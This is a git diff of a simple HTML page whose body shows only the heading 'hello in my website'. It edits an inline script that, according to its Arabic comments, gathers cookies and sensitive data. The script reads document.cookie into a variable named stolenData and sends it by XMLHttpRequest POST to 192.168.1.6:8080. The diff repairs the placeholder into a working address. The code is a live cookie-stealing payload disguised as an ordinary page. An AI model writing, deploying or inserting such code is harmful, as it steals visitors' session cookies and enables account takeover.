@@ -6,22 +6,16 @@
     <body>
        <h1>hello in my website</h1>
 
-      <script>
+       <script>
         // جمع الكوكيز أو أي بيانات حساسة
         var stolenData = document.cookie;
       
         // إنشاء طلب POST لإرسال البيانات إلى الخادم المحلي
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "http://<IP-192.168.1.6>:8080                 ", true); // استبدل <IP-الكمبيوتر-الخاص-بك> بعنوان IP الخاص بجهاز اللابتوب
+        xhr.open("POST", "http://192.168.1.6:8080", true); // تأكد من صحة عنوان الـ IP الخاص بك
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("data=" + encodeURIComponent(stolenData));
       </script>
-      
-      
 
-
-
-  
-    
     </body>
 </html>
